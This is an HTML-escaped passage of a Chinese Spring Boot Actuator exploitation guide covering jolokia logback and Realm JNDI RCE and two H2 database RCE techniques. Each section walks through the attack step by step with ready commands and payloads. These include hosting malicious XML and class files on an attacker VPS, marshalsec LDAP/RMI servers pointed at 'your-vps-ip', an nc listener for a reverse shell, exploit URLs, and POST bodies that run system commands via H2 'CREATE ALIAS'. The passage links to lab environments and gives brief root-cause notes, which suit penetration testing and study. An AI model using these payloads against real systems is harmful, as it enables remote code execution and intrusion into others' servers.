+&lt;p&gt;​	&lt;a href=&quot;https://www.freebuf.com/column/234719.html&quot;&gt;Spring Boot Actuator从未授权访问到getshell&lt;/a&gt;&lt;/p&gt;
+
+&lt;h4 id=&quot;漏洞环境-2&quot;&gt;漏洞环境：&lt;/h4&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://github.com/LandGrey/SpringBootVulExploit/tree/master/repository/springboot-eureka-xstream-rce&quot;&gt;repository/springboot-eureka-xstream-rce&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;正常访问：&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;http://127.0.0.1:9093/env
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;0x04jolokia-logback-jndi-rce&quot;&gt;0x04：jolokia logback JNDI RCE&lt;/h3&gt;
+
+&lt;h4 id=&quot;利用条件-7&quot;&gt;利用条件：&lt;/h4&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;目标网站存在 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/jolokia&lt;/code&gt; 或 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/actuator/jolokia&lt;/code&gt; 接口&lt;/li&gt;
+  &lt;li&gt;目标使用了 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;jolokia-core&lt;/code&gt; 依赖（版本要求暂未知）并且环境中存在相关 MBean&lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;目标可以请求攻击者的 HTTP 服务器（请求可出外网）&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;JNDI 注入受目标 JDK 版本影响，jdk &amp;lt; 6u201/7u191/8u182/11.0.1（LDAP 方式）&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h4 id=&quot;利用方法-7&quot;&gt;利用方法：&lt;/h4&gt;
+
+&lt;h5 id=&quot;步骤一查看已存在的-mbeans&quot;&gt;步骤一：查看已存在的 MBeans&lt;/h5&gt;
+
+&lt;p&gt;访问 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/jolokia/list&lt;/code&gt; 接口，查看是否存在 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ch.qos.logback.classic.jmx.JMXConfigurator&lt;/code&gt; 和 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;reloadByURL&lt;/code&gt; 关键词。&lt;/p&gt;
+
+&lt;h5 id=&quot;步骤二托管-xml-文件&quot;&gt;步骤二：托管 xml 文件&lt;/h5&gt;
+
+&lt;p&gt;在自己控制的 vps 机器上开启一个简单 HTTP 服务器，端口尽量使用常见 HTTP 服务端口（80、443）&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# 使用 python 快速开启 http server&lt;/span&gt;
+
+python2 &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; SimpleHTTPServer 80
+python3 &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; http.server 80
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;在根目录放置以 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;xml&lt;/code&gt; 结尾的 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;example.xml&lt;/code&gt;  文件，内容如下：&lt;/p&gt;
+
+&lt;div class=&quot;language-xml highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;configuration&amp;gt;&lt;/span&gt;
+  &lt;span class=&quot;nt&quot;&gt;&amp;lt;insertFromJNDI&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;env-entry-name=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;ldap://your-vps-ip:1389/JNDIObject&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;as=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;appName&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;/&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;/configuration&amp;gt;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h5 id=&quot;步骤三准备要执行的-java-代码&quot;&gt;步骤三：准备要执行的 Java 代码&lt;/h5&gt;
+
+&lt;p&gt;编写优化过后的用来反弹 shell 的 &lt;a href=&quot;https://raw.githubusercontent.com/LandGrey/SpringBootVulExploit/master/codebase/JNDIObject.java&quot;&gt;Java 示例代码&lt;/a&gt;  &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;JNDIObject.java&lt;/code&gt;，&lt;/p&gt;
+
+&lt;p&gt;使用兼容低版本 jdk 的方式编译：&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;javac &lt;span class=&quot;nt&quot;&gt;-source&lt;/span&gt; 1.5 &lt;span class=&quot;nt&quot;&gt;-target&lt;/span&gt; 1.5 JNDIObject.java
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;然后将生成的 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;JNDIObject.class&lt;/code&gt; 文件拷贝到 &lt;strong&gt;步骤二&lt;/strong&gt; 中的网站根目录。&lt;/p&gt;
+
+&lt;h5 id=&quot;步骤四架设恶意-ldap-服务&quot;&gt;步骤四：架设恶意 ldap 服务&lt;/h5&gt;
+
+&lt;p&gt;下载 &lt;a href=&quot;https://github.com/mbechler/marshalsec&quot;&gt;marshalsec&lt;/a&gt; ，使用下面命令架设对应的 ldap 服务：&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;java &lt;span class=&quot;nt&quot;&gt;-cp&lt;/span&gt; marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://your-vps-ip:80/#JNDIObject 1389
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h5 id=&quot;步骤五监听反弹-shell-的端口&quot;&gt;步骤五：监听反弹 shell 的端口&lt;/h5&gt;
+
+&lt;p&gt;一般使用 nc 监听端口，等待反弹 shell&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nc &lt;span class=&quot;nt&quot;&gt;-lv&lt;/span&gt; 443
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h5 id=&quot;步骤六从外部-url-地址加载日志配置文件&quot;&gt;步骤六：从外部 URL 地址加载日志配置文件&lt;/h5&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;⚠️ 如果目标成功请求了example.xml 并且 marshalsec 也接收到了目标请求，但是目标没有请求 JNDIObject.class，大概率是因为目标环境的 jdk 版本太高，导致 JNDI 利用失败。&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;替换实际的 your-vps-ip 地址访问 URL 触发漏洞：&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;/jolokia/exec/ch.qos.logback.classic:Name=default,Type=ch.qos.logback.classic.jmx.JMXConfigurator/reloadByURL/http:!/!/your-vps-ip!/example.xml
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h4 id=&quot;漏洞原理-3&quot;&gt;漏洞原理：&lt;/h4&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;直接访问可触发漏洞的 URL，相当于通过 jolokia 调用 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ch.qos.logback.classic.jmx.JMXConfigurator&lt;/code&gt; 类的 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;reloadByURL&lt;/code&gt; 方法&lt;/li&gt;
+  &lt;li&gt;目标机器请求外部日志配置文件 URL 地址，获得恶意 xml 文件内容&lt;/li&gt;
+  &lt;li&gt;目标机器使用 saxParser.parse 解析 xml 文件 (这里导致了 xxe 漏洞)&lt;/li&gt;
+  &lt;li&gt;xml 文件中利用 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;logback&lt;/code&gt; 依赖的 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;insertFormJNDI&lt;/code&gt; 标签，设置了外部 JNDI 服务器地址&lt;/li&gt;
+  &lt;li&gt;目标机器请求恶意  JNDI 服务器，导致 JNDI 注入，造成 RCE 漏洞&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;h4 id=&quot;漏洞分析-3&quot;&gt;漏洞分析：&lt;/h4&gt;
+
+&lt;p&gt;​	&lt;a href=&quot;https://xz.aliyun.com/t/4258&quot;&gt;spring boot actuator rce via jolokia&lt;/a&gt;&lt;/p&gt;
+
+&lt;h4 id=&quot;漏洞环境-3&quot;&gt;漏洞环境：&lt;/h4&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://github.com/LandGrey/SpringBootVulExploit/tree/master/repository/springboot-jolokia-logback-rce&quot;&gt;repository/springboot-jolokia-logback-rce&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;正常访问：&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;http://127.0.0.1:9094/env
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;0x05jolokia-realm-jndi-rce&quot;&gt;0x05：jolokia Realm JNDI RCE&lt;/h3&gt;
+
+&lt;h4 id=&quot;利用条件-8&quot;&gt;利用条件：&lt;/h4&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;目标网站存在 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/jolokia&lt;/code&gt; 或 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/actuator/jolokia&lt;/code&gt; 接口&lt;/li&gt;
+  &lt;li&gt;目标使用了 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;jolokia-core&lt;/code&gt; 依赖（版本要求暂未知）并且环境中存在相关 MBean&lt;/li&gt;
+  &lt;li&gt;目标可以请求攻击者的服务器（请求可出外网）&lt;/li&gt;
+  &lt;li&gt;JNDI 注入受目标 JDK 版本影响，jdk &amp;lt; 6u141/7u131/8u121（RMI 方式）&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h4 id=&quot;利用方法-8&quot;&gt;利用方法：&lt;/h4&gt;
+
+&lt;h5 id=&quot;步骤一查看已存在的-mbeans-1&quot;&gt;步骤一：查看已存在的 MBeans&lt;/h5&gt;
+
+&lt;p&gt;访问 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/jolokia/list&lt;/code&gt; 接口，查看是否存在 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;type=MBeanFactory&lt;/code&gt; 和 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;createJNDIRealm&lt;/code&gt; 关键词。&lt;/p&gt;
+
+&lt;h5 id=&quot;步骤二准备要执行的-java-代码&quot;&gt;步骤二：准备要执行的 Java 代码&lt;/h5&gt;
+
+&lt;p&gt;编写优化过后的用来反弹 shell 的 &lt;a href=&quot;https://raw.githubusercontent.com/LandGrey/SpringBootVulExploit/master/codebase/JNDIObject.java&quot;&gt;Java 示例代码&lt;/a&gt;  &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;JNDIObject.java&lt;/code&gt;。&lt;/p&gt;
+
+&lt;h5 id=&quot;步骤三托管-class-文件&quot;&gt;步骤三：托管 class 文件&lt;/h5&gt;
+
+&lt;p&gt;在自己控制的 vps 机器上开启一个简单 HTTP 服务器，端口尽量使用常见 HTTP 服务端口（80、443）&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# 使用 python 快速开启 http server&lt;/span&gt;
+
+python2 &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; SimpleHTTPServer 80
+python3 &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; http.server 80
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;将&lt;strong&gt;步骤二&lt;/strong&gt;中编译好的 class 文件拷贝到 HTTP 服务器根目录。&lt;/p&gt;
+
+&lt;h5 id=&quot;步骤四架设恶意-rmi-服务&quot;&gt;步骤四：架设恶意 rmi 服务&lt;/h5&gt;
+
+&lt;p&gt;下载 &lt;a href=&quot;https://github.com/mbechler/marshalsec&quot;&gt;marshalsec&lt;/a&gt; ，使用下面命令架设对应的 rmi 服务：&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;java &lt;span class=&quot;nt&quot;&gt;-cp&lt;/span&gt; marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer http://your-vps-ip:80/#JNDIObject 1389
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h5 id=&quot;步骤五监听反弹-shell-的端口-1&quot;&gt;步骤五：监听反弹 shell 的端口&lt;/h5&gt;
+
+&lt;p&gt;一般使用 nc 监听端口，等待反弹 shell&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nc &lt;span class=&quot;nt&quot;&gt;-lvp&lt;/span&gt; 443
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h5 id=&quot;步骤六发送恶意-payload&quot;&gt;步骤六：发送恶意 payload&lt;/h5&gt;
+
+&lt;p&gt;根据实际情况修改 &lt;a href=&quot;https://raw.githubusercontent.com/LandGrey/SpringBootVulExploit/master/codebase/springboot-realm-jndi-rce.py&quot;&gt;springboot-realm-jndi-rce.py&lt;/a&gt; 脚本中的目标地址，RMI 地址、端口等信息，然后在自己控制的服务器上运行。&lt;/p&gt;
+
+&lt;h4 id=&quot;漏洞原理-4&quot;&gt;漏洞原理：&lt;/h4&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;利用 jolokia 调用 createJNDIRealm 创建 JNDIRealm&lt;/li&gt;
+  &lt;li&gt;设置 connectionURL 地址为 RMI Service URL&lt;/li&gt;
+  &lt;li&gt;设置 contextFactory 为 RegistryContextFactory&lt;/li&gt;
+  &lt;li&gt;停止 Realm&lt;/li&gt;
+  &lt;li&gt;启动 Realm 以触发指定 RMI 地址的  JNDI 注入，造成 RCE 漏洞&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;h4 id=&quot;漏洞分析-4&quot;&gt;漏洞分析：&lt;/h4&gt;
+
+&lt;p&gt;​	&lt;a href=&quot;https://static.anquanke.com/download/b/security-geek-2019-q1/article-10.html&quot;&gt;Yet Another Way to Exploit Spring Boot Actuators via Jolokia&lt;/a&gt;&lt;/p&gt;
+
+&lt;h4 id=&quot;漏洞环境-4&quot;&gt;漏洞环境：&lt;/h4&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://github.com/LandGrey/SpringBootVulExploit/tree/master/repository/springboot-jolokia-logback-rce&quot;&gt;repository/springboot-jolokia-logback-rce&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;正常访问：&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;http://127.0.0.1:9094/env
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;0x06h2-database-query-rce&quot;&gt;0x06：h2 database query RCE&lt;/h3&gt;
+
+&lt;h4 id=&quot;利用条件-9&quot;&gt;利用条件：&lt;/h4&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;可以 POST 请求目标网站的 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/env&lt;/code&gt; 接口设置属性&lt;/li&gt;
+  &lt;li&gt;可以 POST 请求目标网站的 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/restart&lt;/code&gt; 接口重启应用（存在 spring-boot-starter-actuator 依赖）&lt;/li&gt;
+  &lt;li&gt;存在 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;com.h2database.h2&lt;/code&gt; 依赖（版本要求暂未知）&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h4 id=&quot;利用方法-9&quot;&gt;利用方法：&lt;/h4&gt;
+
+&lt;h5 id=&quot;步骤一设置-springdatasourcehikariconnection-test-query-属性&quot;&gt;步骤一：设置 spring.datasource.hikari.connection-test-query 属性&lt;/h5&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;⚠️ 下面payload 中的 ‘T5’ 方法每一次执行命令后都需要更换名称 (如 T6) ，然后才能被重新创建使用，否则下次 restart 重启应用时漏洞不会被触发&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;spring 1.x（无回显执行命令）&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;POST /env
+Content-Type: application/x-www-form-urlencoded
+
+spring.datasource.hikari.connection-test-query=CREATE ALIAS T5 AS CONCAT(&#39;void ex(String m1,String m2,String m3)throws Exception{Runti&#39;,&#39;me.getRun&#39;,&#39;time().exe&#39;,&#39;c(new String[]{m1,m2,m3});}&#39;);CALL T5(&#39;cmd&#39;,&#39;/c&#39;,&#39;calc&#39;);
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;spring 2.x（无回显执行命令）&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;POST /actuator/env
+Content-Type: application/json
+
+{&quot;name&quot;:&quot;spring.datasource.hikari.connection-test-query&quot;,&quot;value&quot;:&quot;CREATE ALIAS T5 AS CONCAT(&#39;void ex(String m1,String m2,String m3)throws Exception{Runti&#39;,&#39;me.getRun&#39;,&#39;time().exe&#39;,&#39;c(new String[]{m1,m2,m3});}&#39;);CALL T5(&#39;cmd&#39;,&#39;/c&#39;,&#39;calc&#39;);&quot;}
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h5 id=&quot;步骤二重启应用&quot;&gt;步骤二：重启应用&lt;/h5&gt;
+
+&lt;p&gt;spring 1.x&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;POST /restart
+Content-Type: application/x-www-form-urlencoded
+
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;spring 2.x&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;POST /actuator/restart
+Content-Type: application/json
+
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h4 id=&quot;漏洞原理-5&quot;&gt;漏洞原理：&lt;/h4&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;spring.datasource.hikari.connection-test-query 属性被设置为一条恶意的 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;CREATE ALIAS&lt;/code&gt; 创建自定义函数的 SQL 语句&lt;/li&gt;
+  &lt;li&gt;其属性对应 HikariCP 数据库连接池的 connectionTestQuery 配置，定义一个新数据库连接之前被执行的 SQL 语句&lt;/li&gt;
+  &lt;li&gt;restart 重启应用，会建立新的数据库连接&lt;/li&gt;
+  &lt;li&gt;如果 SQL 语句中的自定义函数还没有被执行过，那么自定义函数就会被执行，造成 RCE 漏洞&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;h4 id=&quot;漏洞分析-5&quot;&gt;漏洞分析：&lt;/h4&gt;
+
+&lt;p&gt;​	&lt;a href=&quot;https://spaceraccoon.dev/remote-code-execution-in-three-acts-chaining-exposed-actuators-and-h2-database&quot;&gt;remote-code-execution-in-three-acts-chaining-exposed-actuators-and-h2-database&lt;/a&gt;&lt;/p&gt;
+
+&lt;h4 id=&quot;漏洞环境-5&quot;&gt;漏洞环境：&lt;/h4&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://github.com/LandGrey/SpringBootVulExploit/tree/master/repository/springboot-h2-database-rce&quot;&gt;repository/springboot-h2-database-rce&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;正常访问：&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;http://127.0.0.1:9096/actuator/env
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;0x07h2-database-console-jndi-rce&quot;&gt;0x07：h2 database console JNDI RCE&lt;/h3&gt;
+
+&lt;h4 id=&quot;利用条件-10&quot;&gt;利用条件：&lt;/h4&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;存在 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;com.h2database.h2&lt;/code&gt; 依赖（版本要求暂未知）&lt;/li&gt;
+  &lt;li&gt;spring 配置中启用 h2 console  &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;spring.h2.console.enabled=true&lt;/code&gt;&lt;/li&gt;
+  &lt;li&gt;目标可以请求攻击者的服务器（请求可出外网）&lt;/li&gt;
+  &lt;li&gt;JNDI 注入受目标 JDK 版本影响，jdk &amp;lt; 6u201/7u191/8u182/11.0.1（LDAP 方式）&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h4 id=&quot;利用方法-10&quot;&gt;利用方法：&lt;/h4&gt;
+
+&lt;h5 id=&quot;步骤一访问路由获得-jsessionid&quot;&gt;步骤一：访问路由获得 jsessionid&lt;/h5&gt;
+
+&lt;p&gt;直接访问目标开启 h2 console 的默认路由 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/h2-console&lt;/code&gt;，目标会跳转到页面 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/h2-console/login.jsp?jsessionid=xxxxxx&lt;/code&gt;，记录下实际的 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;jsessionid=xxxxxx&lt;/code&gt; 值。&lt;/p&gt;
+
+&lt;h5 id=&quot;步骤二准备要执行的-java-代码-1&quot;&gt;步骤二：准备要执行的 Java 代码&lt;/h5&gt;
+
+&lt;p&gt;编写优化过后的用来反弹 shell 的 &lt;a href=&quot;https://raw.githubusercontent.com/LandGrey/SpringBootVulExploit/master/codebase/JNDIObject.java&quot;&gt;Java 示例代码&lt;/a&gt;  &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;JNDIObject.java&lt;/code&gt;，&lt;/p&gt;
+
+&lt;p&gt;使用兼容低版本 jdk 的方式编译：&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;javac &lt;span class=&quot;nt&quot;&gt;-source&lt;/span&gt; 1.5 &lt;span class=&quot;nt&quot;&gt;-target&lt;/span&gt; 1.5 JNDIObject.java
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;然后将生成的 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;JNDIObject.class&lt;/code&gt; 文件拷贝到 &lt;strong&gt;步骤二&lt;/strong&gt; 中的网站根目录。&lt;/p&gt;
+
+&lt;h5 id=&quot;步骤三托管-class-文件-1&quot;&gt;步骤三：托管 class 文件&lt;/h5&gt;
+
+&lt;p&gt;在自己控制的 vps 机器上开启一个简单 HTTP 服务器，端口尽量使用常见 HTTP 服务端口（80、443）&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# 使用 python 快速开启 http server&lt;/span&gt;
+
+python2 &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; SimpleHTTPServer 80
+python3 &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; http.server 80
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;将&lt;strong&gt;步骤二&lt;/strong&gt;中编译好的 class 文件拷贝到 HTTP 服务器根目录。&lt;/p&gt;
+
+&lt;h5 id=&quot;步骤四架设恶意-ldap-服务-1&quot;&gt;步骤四：架设恶意 ldap 服务&lt;/h5&gt;
+
+&lt;p&gt;下载 &lt;a href=&quot;https://github.com/mbechler/marshalsec&quot;&gt;marshalsec&lt;/a&gt; ，使用下面命令架设对应的 ldap 服务：&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;java &lt;span class=&quot;nt&quot;&gt;-cp&lt;/span&gt; marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://your-vps-ip:80/#JNDIObject 1389
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h5 id=&quot;步骤五监听反弹-shell-的端口-2&quot;&gt;步骤五：监听反弹 shell 的端口&lt;/h5&gt;
+
+&lt;p&gt;一般使用 nc 监听端口，等待反弹 shell&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nc &lt;span class=&quot;nt&quot;&gt;-lv&lt;/span&gt; 443
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h5 id=&quot;步骤六发包触发-jndi-注入&quot;&gt;步骤六：发包触发 JNDI 注入&lt;/h5&gt;
+
+&lt;p&gt;根据实际情况，替换下面数据中的 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;jsessionid=xxxxxx&lt;/code&gt;、&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;www.example.com&lt;/code&gt; 和 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ldap://your-vps-ip:1389/JNDIObject&lt;/code&gt;&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;POST /h2-console/login.do?jsessionid&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;xxxxxx
+Host: www.example.com
+Content-Type: application/x-www-form-urlencoded
+Referer: http://www.example.com/h2-console/login.jsp?jsessionid&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;xxxxxx
+
+&lt;span class=&quot;nv&quot;&gt;language&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;en&amp;amp;setting&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Generic+H2+%28Embedded%29&amp;amp;name&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Generic+H2+%28Embedded%29&amp;amp;driver&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;javax.naming.InitialContext&amp;amp;url&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;ldap://your-vps-ip:1389/JNDIObject&amp;amp;user&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&amp;amp;password&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h4 id=&quot;漏洞分析-6&quot;&gt;漏洞分析：&lt;/h4&gt;
+
+&lt;p&gt;​	&lt;a href=&quot;https://mp.weixin.qq.com/s/Yn5U8WHGJZbTJsxwUU3UiQ&quot;&gt;Spring Boot + H2数据库JNDI注入&lt;/a&gt;&lt;/p&gt;
+
+&lt;h4 id=&quot;漏洞环境-6&quot;&gt;漏洞环境：&lt;/h4&gt;
+
